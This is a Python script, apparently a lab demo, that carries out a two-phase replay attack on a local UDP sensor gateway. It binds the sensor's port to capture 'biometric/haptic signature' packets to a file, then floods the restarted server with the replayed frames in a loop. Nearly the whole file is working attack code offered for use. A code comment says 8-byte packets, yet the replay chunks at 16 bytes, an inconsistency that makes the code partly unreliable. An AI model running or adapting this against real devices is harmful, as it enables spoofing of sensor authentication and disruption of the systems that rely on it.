import asyncio
import argparse
import struct
import time
import os

# Configuration
TARGET_IP = "127.0.0.1"
TARGET_PORT = 5005
CAPTURE_FILE = "stolen_payload.bin"
CAPTURE_DURATION = 5  # seconds

# ANSI Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"
BLINK = "\033[5m"

class SnifferProtocol(asyncio.DatagramProtocol):
    def __init__(self):
        self.captured_packets = []
        self.packet_count = 0

    def connection_made(self, transport):
        print(f"{GREEN}[SNIFFER] Port {TARGET_PORT} Hijacked. Intercepting stream...{RESET}")

    def datagram_received(self, data, addr):
        self.captured_packets.append(data)
        self.packet_count += 1
        if self.packet_count % 100 == 0:
            print(f"{CYAN}[SNIFFER] Captured {self.packet_count} packets...{RESET}", end='\r')

async def phase_1_sniff():
    print(f"\n{BOLD}{RED}[PHASE 1] THE SNIFFER: Intercepting Biometric Signature...{RESET}")
    print(f"{YELLOW}[INFO] Please ensure the Gateway Server is OFF and Sensor is RUNNING.{RESET}")
    
    loop = asyncio.get_running_loop()
    
    # Hijack the port
    sniffer = SnifferProtocol()
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: sniffer,
        local_addr=(TARGET_IP, TARGET_PORT)
    )
    
    # Sniff for duration
    for i in range(CAPTURE_DURATION, 0, -1):
        print(f"{YELLOW}[SNIFFER] Recording... {i}s remaining{RESET}", end='\r')
        await asyncio.sleep(1)
        
    transport.close()
    
    # Save to disk
    print(f"\n{GREEN}[SNIFFER] Capture Complete. Packets: {sniffer.packet_count}{RESET}")
    with open(CAPTURE_FILE, "wb") as f:
        # We'll simple concat them, but better to pickle or structure? 
        # Requirement says "continuous loop" of "binary buffer". 
        # Sensor sends fixed 8 byte structs. We can just concat.
        for pkt in sniffer.captured_packets:
            f.write(pkt)
            
    print(f"{GREEN}[DISK] Signature saved to {CAPTURE_FILE}{RESET}")
    return sniffer.packet_count

async def phase_2_attack():
    print(f"\n{BOLD}{RED}[PHASE 2] THE ATTACK: Preparing Replay Flood...{RESET}")
    
    # Load Stolen Data
    if not os.path.exists(CAPTURE_FILE):
        print(f"{RED}[ERROR] No stolen payload found! Run Phase 1 first.{RESET}")
        return

    with open(CAPTURE_FILE, "rb") as f:
        blob = f.read()
    
    # Chunk into 16-byte packets (Protocol v2)
    packets = [blob[i:i+16] for i in range(0, len(blob), 16)]
    print(f"{CYAN}[LOADER] Loaded {len(packets)} stolen frames.{RESET}")

    print(f"{YELLOW}[WAIT] Waiting 5 seconds for Gateway Server restart...{RESET}")
    print(f"{BOLD}{BLINK}{RED}>>> PLEASE START THE SERVER NOW! <<<{RESET}")
    
    # Simple countdown
    for k in range(5, 0, -1):
        print(f"Starting in {k}...", end='\r')
        await asyncio.sleep(1)
    
    input(f"\n{YELLOW}[MANUAL OVERRIDE] Press ENTER once Server is UP to trigger flood...{RESET}")

    # Setup Attacker Client
    loop = asyncio.get_running_loop()
    # We send TO target, we don't bind TO target port.
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: asyncio.DatagramProtocol(),
        remote_addr=(TARGET_IP, TARGET_PORT)
    )

    print(f"{BOLD}{RED}[CRITICAL] 💀 REPLAYING STOLEN HAPTIC SIGNATURE...{RESET}")
    
    try:
        idx = 0
        while True:
            # Replay the packet
            transport.sendto(packets[idx])
            
            idx = (idx + 1) % len(packets)
            
            # Maintain roughly 1000Hz (1ms sleep is approx, slightly slower than real time but fine)
            await asyncio.sleep(0.001) 
            
            if idx % 1000 == 0:
                 print(f"{RED}[ATTACK] Injection Round {idx // len(packets)} | Looping Signature...{RESET}", end='\r')

    except KeyboardInterrupt:
        print(f"\n{GREEN}[SYSTEM] Replay Attack Terminated.{RESET}")
    finally:
        transport.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=["sniff", "attack"], help="Run a specific phase only")
    args = parser.parse_args()

    try:
        if args.mode == "sniff":
            asyncio.run(phase_1_sniff())
        elif args.mode == "attack":
            asyncio.run(phase_2_attack())
        else:
            # Full Sequence
            asyncio.run(phase_1_sniff())
            asyncio.run(phase_2_attack())
            
    except OSError as e:
        if "[WinError 10048]" in str(e):
             print(f"\n{BOLD}{RED}[FATAL] CONFLICT DETECTED!{RESET}")
             print(f"{YELLOW}The Sniffer cannot listen because {BOLD}server.py{RESET}{YELLOW} is running.{RESET}")
             print(f"{YELLOW}1. Stop server.py (Ctrl+C){RESET}")
             print(f"{YELLOW}2. Run this script again{RESET}")
        else:
            print(f"{RED}[FATAL] Port Bind Error: {e}{RESET}")

    except KeyboardInterrupt:
        pass
